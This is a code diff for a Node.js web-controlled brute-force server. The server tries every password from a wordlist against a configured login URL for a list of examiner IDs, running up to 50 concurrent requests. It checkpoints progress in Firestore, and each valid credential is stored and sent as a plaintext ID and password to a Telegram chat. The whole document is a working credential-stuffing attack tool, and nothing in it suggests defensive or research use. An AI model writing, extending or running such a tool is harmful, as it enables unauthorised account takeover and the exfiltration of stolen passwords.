@@ -9,32 +9,68 @@ const fs = require('fs');
 const readline = require('readline');
 const pLimit = require('p-limit');
 
-// ==================== INITIALIZATION ====================
-const app = express();
-const server = http.createServer(app);
-const io = socketIo(server);
+// ==================== FIREBASE INIT (via base64 env) ====================
+let serviceAccount;
+if (process.env.FIREBASE_CREDENTIALS_BASE64) {
+  try {
+    const decoded = Buffer.from(process.env.FIREBASE_CREDENTIALS_BASE64, 'base64').toString('utf8');
+    serviceAccount = JSON.parse(decoded);
+    console.log('✅ Firebase credentials loaded from BASE64 env var');
+  } catch (err) {
+    console.error('❌ Failed to parse FIREBASE_CREDENTIALS_BASE64:', err.message);
+    process.exit(1);
+  }
+} else if (process.env.FIREBASE_CREDENTIALS) {
+  // Fallback to file path (local development only)
+  try {
+    serviceAccount = require(process.env.FIREBASE_CREDENTIALS);
+    console.log('✅ Firebase credentials loaded from file');
+  } catch (err) {
+    console.error('❌ Firebase credential file not found:', err.message);
+    process.exit(1);
+  }
+} else {
+  console.error('❌ No Firebase credentials provided. Set FIREBASE_CREDENTIALS_BASE64 in .env');
+  process.exit(1);
+}
 
-app.use(express.static('public'));
-
-// Firebase
-const serviceAccount = require(process.env.FIREBASE_CREDENTIALS);
 admin.initializeApp({
   credential: admin.credential.cert(serviceAccount)
 });
 const db = admin.firestore();
 
-// Telegram
-const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
-const chatId = process.env.TELEGRAM_CHAT_ID;
+// Test Firebase connection
+(async () => {
+  try {
+    await db.collection('_test').doc('conn').set({ time: Date.now() });
+    console.log('✅ Firebase connection successful');
+  } catch (err) {
+    console.error('❌ Firebase connection failed:', err.message);
+    process.exit(1);
+  }
+})();
 
-// Config
+// ==================== TELEGRAM ====================
+let bot = null;
+if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
+  bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
+  console.log('✅ Telegram bot initialized');
+} else {
+  console.log('⚠️ Telegram disabled – missing token or chat ID');
+}
+
+// ==================== CONFIG ====================
+const app = express();
+const server = http.createServer(app);
+const io = socketIo(server);
+app.use(express.static('public'));
+
 const LOGIN_URL = process.env.LOGIN_URL;
 const LOGIN_TYPE = process.env.LOGIN_TYPE;
 const CONCURRENCY = parseInt(process.env.CONCURRENCY) || 50;
 const PASSWORD_FILE = process.env.PASSWORD_FILE;
 const EXAMINER_FILE = process.env.EXAMINER_FILE;
 
-// Global state
 let isRunning = false;
 let isPaused = false;
 let currentCheckpoint = null;
@@ -43,9 +79,7 @@ let totalExaminers = 0;
 let successes = [];
 let speedStats = { requests: 0, startTime: null };
 
-// ==================== HELPER FUNCTIONS ====================
-
-// Load examiner IDs from JSON
+// ==================== LOAD EXAMINERS ====================
 function loadExaminers() {
   const data = fs.readFileSync(EXAMINER_FILE, 'utf8');
   examinerIds = JSON.parse(data);
@@ -53,7 +87,7 @@ function loadExaminers() {
   console.log(`Loaded ${totalExaminers} examiners`);
 }
 
-// Stream passwords one by one without loading all into memory
+// ==================== PASSWORD STREAM ====================
 async function* passwordGenerator(startLine = 0) {
   const fileStream = fs.createReadStream(PASSWORD_FILE);
   const rl = readline.createInterface({ input: fileStream, crlfDelay: Infinity });
@@ -67,7 +101,7 @@ async function* passwordGenerator(startLine = 0) {
   rl.close();
 }
 
-// Check login attempt
+// ==================== LOGIN ATTEMPT ====================
 async function tryLogin(examinerId, password) {
   try {
     const response = await axios.post(LOGIN_URL, {
@@ -87,7 +121,7 @@ async function tryLogin(examinerId, password) {
   }
 }
 
-// Save success to Firebase and send Telegram
+// ==================== HANDLE SUCCESS ====================
 async function handleSuccess(examinerId, password) {
   const docRef = db.collection('successful_logins').doc();
   await docRef.set({
@@ -96,16 +130,17 @@ async function handleSuccess(examinerId, password) {
     timestamp: admin.firestore.FieldValue.serverTimestamp()
   });
   successes.push({ examinerId, password, time: new Date().toISOString() });
-  
+
   // Telegram notification
-  const msg = `✅ *Valid Credential Found!*\n👤 Examiner: ${examinerId}\n🔑 Password: ${password}\n🕒 Time: ${new Date().toLocaleString()}`;
-  await bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
-  
-  // Emit to Web UI
+  if (bot) {
+    const msg = `✅ *Valid Credential Found!*\n👤 Examiner: ${examinerId}\n🔑 Password: ${password}\n🕒 Time: ${new Date().toLocaleString()}`;
+    await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, msg, { parse_mode: 'Markdown' }).catch(e => console.error('Telegram error:', e.message));
+  }
+
   io.emit('success', { examinerId, password, time: new Date().toISOString() });
 }
 
-// Update checkpoint in Firebase
+// ==================== CHECKPOINT (Firestore) ====================
 async function updateCheckpoint(examinerIndex, passwordIndex) {
   const checkpointRef = db.collection('checkpoint').doc('current');
   await checkpointRef.set({
@@ -117,7 +152,6 @@ async function updateCheckpoint(examinerIndex, passwordIndex) {
   currentCheckpoint = { examinerIndex, passwordIndex };
 }
 
-// Load checkpoint from Firebase
 async function loadCheckpoint() {
   const doc = await db.collection('checkpoint').doc('current').get();
   if (doc.exists) {
@@ -128,11 +162,10 @@ async function loadCheckpoint() {
   return { examinerIndex: 0, passwordIndex: 0 };
 }
 
-// ==================== MAIN BRUTE-FORCE ENGINE ====================
+// ==================== MAIN ATTACK ENGINE ====================
 async function startAttack(resumeFromCheckpoint = true) {
   if (isRunning) return;
-  
-  // Load checkpoint
+
   let startExaminerIdx = 0;
   let startPasswordIdx = 0;
   if (resumeFromCheckpoint && currentCheckpoint) {
@@ -140,50 +173,41 @@ async function startAttack(resumeFromCheckpoint = true) {
     startPasswordIdx = currentCheckpoint.passwordIndex;
     console.log(`Resuming from examiner index ${startExaminerIdx}, password index ${startPasswordIdx}`);
   }
-  
+
   isRunning = true;
   isPaused = false;
   speedStats.requests = 0;
   speedStats.startTime = Date.now();
-  
+
   io.emit('status', { running: true, paused: false, message: 'Attack started' });
-  
+
   for (let eIdx = startExaminerIdx; eIdx < totalExaminers && isRunning && !isPaused; eIdx++) {
     const examinerId = examinerIds[eIdx];
-    
-    // Skip if already found (optional: check Firebase if already success)
+
+    // Skip if already found
     const existing = await db.collection('successful_logins').where('examinerId', '==', examinerId).get();
     if (!existing.empty) {
       console.log(`Skipping ${examinerId} - already found`);
       continue;
     }
-    
-    // For each examiner, we will try passwords in order
+
     let passwordIndex = (eIdx === startExaminerIdx) ? startPasswordIdx : 0;
     const passGen = passwordGenerator(passwordIndex);
-    let completed = false;
-    
-    // Use concurrency limiter for requests inside this examiner
     const limit = pLimit(CONCURRENCY);
     const tasks = [];
-    
+
     for await (const password of passGen) {
-      if (!isRunning || isPaused) {
-        completed = true;
-        break;
-      }
-      
+      if (!isRunning || isPaused) break;
+
       const task = limit(async () => {
         const result = await tryLogin(examinerId, password);
         if (result.success) {
           await handleSuccess(examinerId, result.password);
-          // Stop trying for this examiner
           return 'found';
         }
-        // Update checkpoint periodically (every 100 passwords)
+        // Update checkpoint periodically
         if (speedStats.requests % 100 === 0) {
           await updateCheckpoint(eIdx, passwordIndex + 1);
-          // Emit progress to UI
           const elapsed = (Date.now() - speedStats.startTime) / 1000;
           const speed = elapsed > 0 ? Math.round(speedStats.requests / elapsed) : 0;
           io.emit('progress', {
@@ -198,16 +222,11 @@ async function startAttack(resumeFromCheckpoint = true) {
         return null;
       });
       tasks.push(task);
-      
-      // Small delay to let tasks queue, but not necessary
       await new Promise(r => setImmediate(r));
     }
-    
-    // Wait for all pending tasks of this examiner to finish
+
     await Promise.all(tasks);
-    if (completed) break;
-    
-    // Update checkpoint after finishing this examiner
+    if (!isRunning || isPaused) break;
     await updateCheckpoint(eIdx + 1, 0);
     io.emit('progress', {
       examinerIndex: eIdx + 1,
@@ -216,13 +235,13 @@ async function startAttack(resumeFromCheckpoint = true) {
       currentExaminer: examinerIds[eIdx + 1] || 'Done'
     });
   }
-  
+
   isRunning = false;
   io.emit('status', { running: false, paused: false, message: 'Attack finished' });
   await updateCheckpoint(totalExaminers, 0);
 }
 
-// ==================== EXPRESS ROUTES & SOCKET.IO ====================
+// ==================== API & SOCKET.IO ====================
 app.get('/api/stats', async (req, res) => {
   const successesSnapshot = await db.collection('successful_logins').get();
   const successList = successesSnapshot.docs.map(doc => doc.data());
@@ -245,12 +264,12 @@ io.on('connection', (socket) => {
     isPaused,
     checkpoint: currentCheckpoint
   });
-  
+
   socket.on('start', async () => {
     if (isRunning) return;
     await startAttack(true);
   });
-  
+
   socket.on('pause', async () => {
     if (!isRunning) return;
     isPaused = true;
@@ -258,12 +277,12 @@ io.on('connection', (socket) => {
     await updateCheckpoint(currentCheckpoint.examinerIndex, currentCheckpoint.passwordIndex);
     io.emit('status', { running: false, paused: true, message: 'Paused' });
   });
-  
+
   socket.on('resume', async () => {
     if (isRunning || !currentCheckpoint) return;
     await startAttack(true);
   });
-  
+
   socket.on('stop', async () => {
     isRunning = false;
     isPaused = false;
@@ -276,6 +295,6 @@ io.on('connection', (socket) => {
 loadExaminers();
 loadCheckpoint().then(() => {
   server.listen(process.env.PORT || 3000, () => {
-    console.log(`Server running on port ${process.env.PORT || 3000}`);
+    console.log(`🚀 Server running on http://localhost:${process.env.PORT || 3000}`);
   });
 });
